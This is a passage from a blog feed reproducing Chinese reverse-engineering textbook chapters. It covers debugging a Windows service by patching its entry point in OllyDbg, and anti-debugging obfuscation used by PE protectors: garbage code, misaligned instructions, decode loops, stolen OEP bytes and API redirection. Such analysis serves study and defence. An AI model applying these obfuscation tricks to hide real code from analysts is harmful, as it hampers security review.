src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328203550913.png#crop=0&crop=0&crop=1&crop=1&id=e6s1E&originHeight=85&originWidth=717&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>原EP代码的前2个字节为0xEB、0xC0（希望各位记住）。在调试器中查看该位置，如图54-25所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328204743703.png#crop=0&crop=0&crop=1&crop=1&id=cS4y9&originHeight=147&originWidth=492&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>0xEB、0xC0是CALL指令的一部分，把它们分别修改为0xEB、0xFE，如图54-26所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328204617867.png#crop=0&crop=0&crop=1&crop=1&id=oDKfA&originHeight=102&originWidth=718&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>使用OllyDbg调试器查看修改后的EP代码，如图54-27所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328204914805.png#crop=0&crop=0&crop=1&crop=1&id=fEUNO&originHeight=84&originWidth=555&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><blockquote><p>虽然可以背诵0xEB、0xFE，但尽量理解其原理会比较好。从IA-32用户手册上可知，操作码0xEB是近距离（Short Distance）JMP指令，带有1个字节大小的值，该值为Signed Value（有符号数），指的是“与Next EIP的相对距离”，计算时有如下公式：</p><p>Jump Address&#x3D;Next EIP(401826)+0xFE(-2)&#x3D;401824</p><p>许多JMP&#x2F;CALL指令都使用上面这样的“相对距离”，请各位熟记上述计算方法。关于IA-32指令的详细说明请参考第49章。</p></blockquote><p>（4）启动服务</p><p>启动SvcTest服务（参考图54-10）。使用Process Explorer查看SvcTest服务进（DebugMe1.exe），<br>可以发现服务进程陷入无限循环，CPU占有率升至近100%，如图54-28所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328205809719.png#crop=0&crop=0&crop=1&crop=1&id=tVRmB&originHeight=137&originWidth=549&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><blockquote><p>实际测试被限定在了50%</p></blockquote><blockquote><p>若系统为Windows 7，启动服务进程时会弹出警告信息框，如图54-29所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328205844998.png#crop=0&crop=0&crop=1&crop=1&id=kdosw&originHeight=247&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>错误1503就是ERROR_SERVICE_REQUEST_TIMEOUT错误，因为终止的不是服务进程，所以可以继续。</p><ul><li>若向注册表添加ServicesTimeOut之前出现上述错误，服务进程就会终止执行。 </li><li>在Windows XP系统下向注册表添加ServicesTimeOut后，不会出现上述信息框。</li></ul></blockquote><p><strong>（5）附加至调试器</strong></p><p>在OllyDbg调试器的菜单栏中依次选择File-Attach菜单，选择DebugMe1.exe进程，将其附加到调试器后，调试器在系统库区域（ntdll.DbgBreakPoint）暂停，如图54-31所示。</p><blockquote><p>使用 Ollydbg2.0 后 暂停的地方是死循环的地点，即原本的EntryPoint</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220329193208873.png#crop=0&crop=0&crop=1&crop=1&id=zMGbL&originHeight=127&originWidth=1060&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><strong>（6）修改进程：删除无限循环</strong></p><p>使用Ctrl+G命令转到DebugMe1.exe进程的EP地址处（VA: 401824）（参考图54-23、图54-25、 图54-27）。</p><p>先按F2键在EP地址处设置断点，然后按F9键运行，如图54-32所示，控制在EP地址处停下来。 在401824地址处使用OllyDbg的编辑功能（Ctrl+E）,将指令恢复为原来的指令代码（0xE8、0xC0），如图54-33所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220329193333114.png#crop=0&crop=0&crop=1&crop=1&id=jEa9a&originHeight=302&originWidth=637&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>从图54-34中可以看到，指令代码已经被修改为原来的指令代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220329193355040.png#crop=0&crop=0&crop=1&crop=1&id=td96A&originHeight=126&originWidth=661&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>接下来只要调试目标代码就可以了。</p><blockquote><p>图54-34的状态并非服务正常运行的状态<img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220329195828328.png#crop=0&crop=0&crop=1&crop=1&id=hM2t8&originHeight=427&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">，需要在服务主函数中调用SetServiceStatus() API将服务状态更改为 SERVICE_RUNNING状态才行。</p></blockquote><p>在图54-35中继续调试，调用完401357地址处的SetServiceStatus() API后，SvcTest服务进程（DebugMe1.exe）的状态就变为“启动”状态，如图54-36所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220329195903228.png#crop=0&crop=0&crop=1&crop=1&id=R1I5q&originHeight=394&originWidth=438&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h1 id="54-5小结"><a href="#54-5小结" class="headerlink" title="54.5小结"></a>54.5小结</h1><p>本章讲解了服务进程的工作原理及调试方法。虽然没有什么特别难的内容，但如果不理解服务工作原理，就无法准确调试服务主函数。因此，不要只是背下服务进程的调试技术，而要把学习重点放在理解其工作原理上。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第53章 高级反调试技术</title>
    <link href="/1999/05/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <url>/1999/05/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p>本章将与各位一起学习高级反调试技术（Advanced Anti-Debugging )，这些技术大量应用于各种著名的程序保护器。下面调试示例程序来了解各种高级反调试技术，相信各位的水平会得到很大提高。</p><h1 id="53-1-高级反调试技术"><a href="#53-1-高级反调试技术" class="headerlink" title="53.1 高级反调试技术"></a>53.1 高级反调试技术</h1><p>PE保护器中使用的高级反调试技术有一些共同特征，如技术难度较高等，令代码逆向分析人员身心俱疲。</p><p>应用了这些高级反调试技术的程序包含大量垃圾代码、条件分支语句、循环语句、加密&#x2F;解密代码以及“深不见底”的调用树（Call-Tree)，代码逆向分析人员一旦陷人其中便会迷失方向，根本无法访问到实际要分析的代码，只是在无关紧要的地方徘徊。这些混乱加上代码中动态反调试技术的干扰，使代码逆向分析人员处于束手无策的尴尬境地。</p><p>当然，这并不是说调试全无可能，只是说调试的难度大大增加了。对于一名经验丰富的代码逆向分析人员而言，分析PE保护器也是一个非常棘手的问题，需要花费大量的时间与精力。而且， “完美分析”本身就是极其艰巨的任务。</p><p>本章将向各位介绍几种典型的高级反调试技术，激起大家的学习兴趣，从而帮助各位进一步提高自身的调试水平。</p><h1 id="53-2-垃圾代码"><a href="#53-2-垃圾代码" class="headerlink" title="53.2 垃圾代码"></a>53.2 垃圾代码</h1><p>向程序添加大量无意义的代码来增加代码调试的难度，这就是“垃圾代码”反调试技术。尤其是，这些垃圾代码中还含有真正有用的代码或者应用其他反调试技术时，调试程序会变得更加困难。</p><p>图53-1显示的是垃圾代码（Garbage code )示例之一。 图53-1所示的代码中，一些指令（PUSH&#x2F;POP、XCHG、MOV)拥有相同的操作数，最终执行的是一些毫无意义的运算（命令执行后没有什么变化)。 图53-2的示例二的垃圾代码利用SUB与ADD指令为EBX设置值，最后执行4041A0地址处的<code>JMP EBX</code>指令。除此之外，其余指令全部都是垃圾代码，原本用1条JMP XXXXXXXX指令即可实现操作，结果却用了很长、很复杂的代码来实现。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325181727077.png#alt=image-20220325181727077"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325181752126.png#alt=image-20220325181752126"></p><blockquote><p>以上示例代码非常简单，调试过程中很容易跳过它们。但是实际的垃圾代码往往具有精巧又复杂的形态，含有大量条件分支语句和无尽的函数调用，想要跳过它们并非易事。</p></blockquote><h1 id="53-3扰乱代码对齐"><a href="#53-3扰乱代码对齐" class="headerlink" title="53.3扰乱代码对齐"></a>53.3扰乱代码对齐</h1><p>熟悉了IA-32指令后，巧妙编写汇编代码即可干扰调试器的反汇编结果，反汇编代码看上去会乱作一团，如图53-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325181832991.png#alt=image-20220325181832991"></p><p>从图53-3的代码可以看岀，41510F地址处的JMP指令用来跳转到415117地址处，但是415117地址处的反汇编代码却未能正常显示。这是由于扰乱代码对齐（Breaking Code Alignment）使OllyDbg调试器生成了错误的反汇编代码。</p><p>415115地址处的指令中，操作码为“A3”，对应于MOV指令，用来处理4个字节大小的立即数值。所以该地址处的指令长度最终被解析为5个字节，这正是扰乱代码对齐的花招。415115地址处的“A368” 指令是故意添加的代码，用来扰乱反汇编代码，程序中未使用它，实际的代码仅为415117地址处的 “7201”。</p><blockquote><p>关于IA-32指令解析的内容请参考第49章。</p></blockquote><p>借助StepInto命令进入415117地址，显示正常代码，如图53-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325182142440.png#alt=image-20220325182142440"></p><p>415117地址处的JB指令也应用了相同技法，打乱了代码对齐。这种“向代码插入（经过精巧设计的）不必要的代码来降低反汇编代码可读性”的技术称为扰乱代码对齐。</p><p>尚未完全掌握代码就贸然使用StepOver(F8)等命令追踪调试，很有可能遭遇其他反调试技术拦截。总之，扰乱代码对齐技术是最令代码逆向分析人员苦恼的技术之一。</p><blockquote><p>大部分调试器都拥有IA-32指令智能解析功能，用来生成反汇编代码。OllyDbg调试器也有类似的分析（Analysis)功能，用来提高反汇编代码的可读性。在图53-3中 按Ctrl+A快捷键，弹出图53-5所示的警告窗口（初次调试程序时，若有异常，也会弹出该警告窗口）。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325182431965.png#alt=image-20220325182431965"></p><p>如图53-6所示，OllyDbg调试器无法正常解析指令，反汇编代码解析（Analysis ) 从415115地址开始就失败了。这是因为解析结果中415115~415116地址间的指令(“A368”）被认为语义不正确。</p><p>单击“是（Y）“，显示图53-6所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325182528875.png#alt=image-20220325182528875"></p><p>从代码流看，程序执行要跳转到415117地址处，但是415112地址与415117地址间的A368指令未能解析为正常的IA-32指令（2字节大小）（A3是总长度为5字节的指令，但根据前后代码看，它仅有2个字节）。此时关闭OllyDbg调试器的解析功能反而会更好。单击鼠标右键，在弹出菜单中依次选择Analysis-Remove analysis frommodule,如图53-7所示。</p><p>这样，OllyDbg调试器就不会对代码进行智能解析，而是直接显示原先的反汇编代码，如图53-3所示。</p><p>接下来，使用带有强大反汇编功能的IDAPro来分析相同代码，如图53-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325182622432.png#alt=image-20220325182622432"></p><p>可以看到出现了相同的现象。去往实际地址前，程序代码在OllyDbg与IDA Pro 中都处在代码非对齐状态。</p><blockquote><p>我们通常把纠缠混合在一起的代码称为“混乱代码”（Obfuscated Code ),它们会增加阅读分析代码的难度。灵活运用垃圾代码与扰乱代码对齐技术能够产生非常棒的“混乱代码”。</p></blockquote><h1 id="53-4加密-x2F-解密"><a href="#53-4加密-x2F-解密" class="headerlink" title="53.4加密&#x2F;解密"></a>53.4加密&#x2F;解密</h1><p>加密&#x2F;解密(Encryption&#x2F;Decryption )是压缩器与保护器中经常使用的技术，用来隐藏程序代码与数据，从而有效防止调试分析程序。</p><blockquote><p>计算机领域中将“为正常代码加密”的行为称为“编码”（Encoding)，而把“解 密代码”的行为称为“解码”（Decoding)。</p></blockquote><h2 id="53-4-1简单的解码示例"><a href="#53-4-1简单的解码示例" class="headerlink" title="53.4.1简单的解码示例"></a>53.4.1简单的解码示例</h2><p>下面看个简单的解码示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0040B000 MOV ECX,100<br>0040B005 MOV ESI,0040B010<br>0040B00A XOR BYTE PTR DS:[ESI],7F<br>0040B00D INC ESI<br>0040B00E LOOPD SHORT 0040B00A<br>0040B010 POP DS<br>0040B011 XCHG EAX,EDI<br>0040B012 JG SHORT 0040B093<br>0040B014 JG SHORT 0040B095<br></code></pre></td></tr></table></figure><p>40B000<del>40B00E地址间的代码是解码循环，用来对40B010</del>40B110地址区域进行解码（XOR 7F )。40B010地址以后的代码只有经过解码才能正常显示。</p><blockquote><p>反转储技术中，加密代码被解码为正常代码后，有时会被再次加密。转储运行中的进程内存代码时，得到的代码仍然处于加密状态。</p></blockquote><h2 id="53-4-2-复杂的解码示例"><a href="#53-4-2-复杂的解码示例" class="headerlink" title="53.4.2 复杂的解码示例"></a>53.4.2 复杂的解码示例</h2><p>下面看个更复杂的解码循环，其内部包含大量垃圾代码，如代码53-2所示。</p><blockquote><p>**005910D1CALL 005910E2 ;(<em>)</em></p></blockquote><p>005910D6HLT</p><p>005910D7SBB EAX,19606392</p><p>005910DCFIDIVR WORD PTR DS:[EDI+DBEAD58C]</p><p>005910E2JNB 005910ED</p><p>005910E8ADC DX,0A953</p><p><strong>005910EDPOP EBX ; EBX &#x3D; 5910D6</strong></p><p>005910F3JNB 0059110B</p><p>005910F9JMP 0059110B</p><p>0059110BPOP ESI</p><p><strong>0059110CADD EBX,0A42 ; EBX &#x3D; 591B18</strong></p><p>00591112PUSH 7FFFAA31</p><p>00591117MOV EDI,7944ECA2</p><p>0059111CPOP ESI</p><p><strong>0059111DMOV EAX,252 ; EAX &#x3D; 252 (loop count)</strong></p><p>00591122JMP 00591138</p><blockquote><p>…</p></blockquote><blockquote><p><strong>00591138MOV ECX,DWORD PTR DS:[EBX]</strong></p></blockquote><p>0059113AMOV EDI,22AC5676</p><p><strong>0059113FSUB ECX,425C7573</strong></p><p>00591145MOV ESI,EDI</p><p><strong>00591147ADD ECX,77193C30</strong></p><p>0059114DPUSH EDI</p><p>0059114ECALL 00591164</p><blockquote><p>…</p></blockquote><blockquote><p>00591164MOV ESI,4B1DFA57</p></blockquote><p>00591169POP EDI</p><p>0059116APOP EDI</p><p><strong>0059116BSUB ECX,233570A9</strong></p><p>00591171PUSH ESI</p><p>00591172JG 0059117D</p><p>00591178MOV EDI,0A7E8B74</p><p>0059117DPOP EDI</p><p><strong>0059117EMOV DWORD PTR DS:[EBX],ECX</strong></p><p>00591180PUSH EBX</p><p>00591181MOV DX,CX</p><p>00591184POP EDX</p><p><strong>00591185SUB EBX,4E777037</strong></p><p>0059118BJMP 00591197</p><p>00591190RCL DWORD PTR DS:[EAX],CL</p><p>00591192OR DWORD PTR DS:[ESI],ECX</p><p>00591194DAS</p><p>00591195CMP AL,0C5</p><p><strong>00591197ADD EBX,4E777033</strong></p><p>0059119DMOV DH,8B</p><p><strong>0059119FSUB EAX,1</strong></p><p><strong>005911A2JNZ 005911C3</strong></p><p>005911A8SUB DX,421F</p><p><strong>005911ADJMP 005911D4 ; 解码结束后跳到解密后的代码</strong></p><p>005911B2XOR EAX,B1583BCA</p><p>005911B7XCHG EAX,ESI</p><p>005911B8POP SS</p><p>005911B9ADD AL,0ED</p><p>005911BBAND DH,BYTE PTR DS:[EBX+F6EE970]</p><p>005911C1PUSHFD</p><p>005911C2MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESIJ</p><p><strong>005911C3JMP 00591138 ; 继续解码</strong></p><p>以上代码中，有效指令与垃圾指令混在一起，看上去比较复杂。但跟踪调试可以发现，上述代码就是解码循环，并且我们能够从中找出有效指令（以上代码用黑粗体表示有效指令)。其中最核心的指令如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00591138MOV ECX,DWORD PTR DS:[EBX]<br>0059113FSUB ECX,425C7573;;;;;;;;;;;;;;;;;;;;<br>00591147ADD ECX,77193C30;&quot;ADD ECX,11875614&quot;;<br>0059116BSUB ECX,233570A9;;;;;;;;;;;;;;;;;;;;<br>0059117EMOV DWORD PTR DS:[EBX],ECX<br></code></pre></td></tr></table></figure><p>上述代码中，先从EBX寄存器所指地址中读取DWORD（4个字节）值，然后与0x11875614相加，再写入原地址。也就是说，在原值基础上加了0x11875614。</p><p>EAX寄存器用来为解码循环计数，它先被59111D地址处的MOV指令初始化为0x252,然后被59119F地址处的SUB指令减去1。要解密区域的地址存储在EBX寄存器中，在005910D1、005910ED、0059110C地址处指令的作用下，EBX寄存器的初始值被设置为591B18,然后在以下2条指令的作用下减去4 (EBX的范围为5911D4~591B18)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00591185SUB EBX,4E777037<br>00591197ADD EBX,4E777033<br></code></pre></td></tr></table></figure><p>最后，所有解码完成后，执行5911AD地址处的JMP指令，跳转到5911D4地址处（解密代码的起始位置)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">O05911ADJMP 005911D4<br></code></pre></td></tr></table></figure><blockquote><p>从代码53-2中删除垃圾指令后，对代码简单整理如下：</p></blockquote><p>005910D1MOV EAX,252</p><p>005910D6MOV EBX,00591B18</p><p>005910DBMOV ECX,DWORD PTR DS:[EBX]</p><p>005910DDADD ECX,11875614</p><p>005910E3MOV DWORD PTR DS:[EBX],ECX</p><p>005910E5SUB EBX,4</p><p>005910E8DEC EAX</p><p>005910E9JNZ SHORT 005910DB</p><p>005910EBJMP 005911D4</p><h2 id="53-4-3-特殊情况：代码重组"><a href="#53-4-3-特殊情况：代码重组" class="headerlink" title="53.4.3 特殊情况：代码重组"></a>53.4.3 特殊情况：代码重组</h2><p>有些程序保护器为了降低代码可读性，增加代码跟踪难度，采用了实时组合执行代码的技术手法。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325185704090.png#alt=image-20220325185704090"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325185720983.png#alt=image-20220325185720983"></p><p>图53-9中，4150E3地址处的SUB指令与4150E9地址处的DEC指令用来修改其下的代码（分别为4150EF、4150EC）。执行这2条指令后，其下的代码变形如图53-10所示。</p><p>可以看到，重新生成了4150EC地址处的指令，CPU会执行新的指令代码。</p><p>该技术的另一个优点是，用户在解码的代码处设置软件断点（0xCC)后，程序运行就会引发运行时错误。这是因为，设有断点的区域被0xCC取代，从而出现完全不同的计算结果（OllyDbg 调试器中，为了保护设有软件断点的地址中的数据，干脆禁止写入新值）。</p><blockquote><p>以上代码为PESpin保护器（PESpin(1.32).exe)的EP代码</p></blockquote><h1 id="53-5-Stolen-Bytes-Remove-OEP"><a href="#53-5-Stolen-Bytes-Remove-OEP" class="headerlink" title="53.5 Stolen Bytes (Remove OEP)"></a>53.5 Stolen Bytes (Remove OEP)</h1><p>Stolen Bytes（或者Remove OEP）技术将部分源代码（主要是OEP代码）转移到压缩器&#x2F;保护器创建的内存区域运行。</p><p>该技术的优点是，转储进程内存时，一部分OEP代码会被删除，转储的文件无法正常运行反转储技术。另一优点是，应用Stolen Bytes技术的文件再次经过压缩器&#x2F;保护器压缩后，会给逆向分析人员造成很大混乱。文件脱壳后，得到的不是熟悉的OEP代码，而是其他形态的代码，这很难判断是脱壳成功还是需要继续操作，容易引起代码逆向分析人员的混乱（我们常用“迷路、徘徊”等词汇描述这种状态）。为帮助各位理解该技术，下面分析练习示例（stolen_bytes.exe）。首先在OllyDbg调试器中打开示例程序，进入程序的EP代码，如图53-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325190918476.png#alt=image-20220325190918476"></p><p>示例程序（stolen_bytes.exe）是用Microsoft Visual C++ 6.0工具编译的可执行文件，图53-11为其EP代码（使用Visual C++ 2008&#x2F;2010编译的可执行文件的EP代码形态与此不同）。在PESpin保护器中开启“RemoveOEP”选项，打开示例程序文件，执行“Protect”（保护文</p><p>件）操作（stolen_bytes_pespin.exe）。在OllyDbg调试器中打开stolen_bytes_pespin.exe程序文件，转到OEP附近的地址处（参考图53-12）。</p><blockquote><p>使用作者提供的二进制文件，发现是一些垃圾代码，并没有被替换成NULL。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325192425487.png#alt=image-20220325192425487"></p><p>从图53-12可以看到，401088地址之前的代码都被替换为NULL值（请与前图中的EP代码比较）。虽然图53-12并未显示全部代码，但可以看到OEP（401041）~401087区域中的代码已被删除。删除的代码被保存到PESpin添加的节区，脱壳后调用执行。以下代码就是保存在PESpin节区中的“消失的OEP代码”。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325193633799.png#alt=image-20220325193633799"></p><p>从以上代码可以看岀，OEP代码采用了扰乱代码对齐技术拆分保存。最终执行40CD76地址处的JMP指令，将程序执行跳转到源代码节区（401088）。</p><p>不同类型保护器的处理方式不同，有些保护器会先保存Stolen Bytes再运行，而有些保护器运行完Stolen Bytes后会将它们直接从内存中删除（分配内存-解密Stolen Bytes代码-运行-释放内存）。</p><h1 id="53-6-API-重定向"><a href="#53-6-API-重定向" class="headerlink" title="53.6 API 重定向"></a>53.6 API 重定向</h1><p>在主要的Win32 API（文件、注册表、进程、网络等）处设置断点，就能在调试程序时快速掌握代码流。</p><p>图53-13是OllyDbg调试器的断点窗口，列岀了主要API起始代码中设置的断点。在该状态下运行（RUN（F9））被调试进程，每当调用以上断点列表中的API时，程序暂停执行，返回地址被存储到栈（参考图53-14）。接下来，只要从返回地址继续调试就可以了。要调试的代码非常多时，采用该方法非常高效，且能轻松进入核心代码调试。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325193731396.png#alt=image-20220325193731396"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325193920864.png#alt=image-20220325193920864"></p><p>API重定向就是破解上面这种调试手法的技术。程序保护器通常会先将全部（或部分）主要的API代码复制到其他内存区域，然后分析要保护的目标进程代码，修改调用API的代码，从而使自身复制的API代码得以执行。这样，即使在原API地址处设置断点也没用（此外，该技术还支持反转储功能）。</p><p>下面分析一段应用API重定向技术的代码，帮助各位加深理解。</p><h2 id="53-6-1-原代码"><a href="#53-6-1-原代码" class="headerlink" title="53.6.1 原代码"></a>53.6.1 原代码</h2><p>首先在OllyDbg调试器中打开示例程序（api_redirection_org.exe），原代码如图53-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325194812758.png#alt=image-20220325194812758"></p><p>4010B5地址处的<code>CALL DWORD PTR DS:[406000]</code>指令中，地址406000即为IAT区域，其中含有kernel32!GetCommandLineA()API地址（7C812FAD）。kernel32!GetCommandLineA()API的实际代码如图53-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325194925059.png#alt=image-20220325194925059"></p><p>可以看到其代码非常简单，仅返回7C8855F4地址（kernel32.dll的.data区域）中存储的值。严格地说，DWORD PTR DS:[7C8855F4]为kernel32.dll的全局变量。</p><h2 id="53-6-2-API重定向示例-1"><a href="#53-6-2-API重定向示例-1" class="headerlink" title="53.6.2 API重定向示例#1"></a>53.6.2 